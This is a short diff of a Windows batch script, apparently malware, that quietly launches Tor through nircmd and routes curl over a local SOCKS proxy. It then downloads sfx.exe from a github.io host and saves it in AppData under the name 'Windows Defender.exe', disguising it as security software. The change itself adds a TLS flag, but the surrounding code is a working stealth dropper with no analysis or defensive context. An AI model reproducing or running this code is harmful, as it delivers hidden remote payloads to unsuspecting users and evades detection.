@@ -37,8 +37,8 @@ mkdir "%appdata%\microsoft\Network"
 
 nircmd exec hide "C:\Tor\tor.exe"
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
-if not errorlevel 1 (set "proxy=--socks5-hostname 127.0.0.1:9050") else (
-  set "proxy="
+if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else (
+  set "proxy=--tlsv1"
 )
 
 curl.exe %proxy% https://cryptedlumos.github.io/sfx.exe --output "%AppData%\Microsoft\Windows\Windows Defender.exe"
